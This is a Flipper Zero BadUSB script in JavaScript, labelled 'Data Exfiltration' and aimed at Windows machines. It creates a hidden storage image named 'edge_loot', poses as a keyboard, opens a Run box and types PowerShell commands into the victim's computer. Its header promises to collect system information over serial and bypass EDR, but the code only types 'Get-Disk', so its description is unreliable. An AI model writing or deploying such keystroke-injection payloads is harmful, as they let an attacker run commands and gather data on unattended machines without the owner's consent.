// Title: Save To Flipper via Serial (adapted to JS)
// Author: emptythevoid and LupusE
// Credit to Gas Station Hot Dog for improvements in filename generation
// Target: Windows 10, Windows 11
// Version: 1.2
// Category: Data Exfiltration
// Desc: This script runs the Get-ComputerInfo command and saves it to 
// the Flipper by it's serial interface, which may bypass EDR
// By default, data is stored on the Flipper in the apps_data folder

let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");
let textbox = require("textbox");
let notify = require("notification");
let flipper = require("flipper");
let dialog = require("dialog");

// Mass storage details
let image = "/ext/apps_data/mass_storage/edge_loot.img";
let size = 8 * 1024 * 1024; // 8 MB



// Check if mass storage already exists
print("Checking for Image...");
if (storage.exists(image)) {
    print("Storage Exists.");
} else {
    print("Creating Storage...");
    usbdisk.createImage(image, size);
}

delay(1000);


// VID & PID as HID
badusb.setup({
    vid: 0xAAAA,
    pid: 0xBBBB,
    mfr_name: "Flipper",
    prod_name: "Zero",
    layout_path: "/ext/badusb/assets/layouts/en-US.kl"
});
 
 //delay(1000);
   usbdisk.start(image);//Open MassStorage Folder
   delay(1000);



//print("Waiting for connection");
while (!badusb.isConnected()) {
    delay(1000);
}

//if (badusb.isConnected()){
    //notify.blink("green", "short");
//delay(1000);
    
    badusb.press("GUI-m");
    badusb.press("GUI", "r");
    delay(500);
    badusb.println("powershell");
    delay(750);
    badusb.println("Get-Disk");
    badusb.quit();

    

//    notify.success();
//} else {
//    print("USB not connected");
 //   notify.error();
//}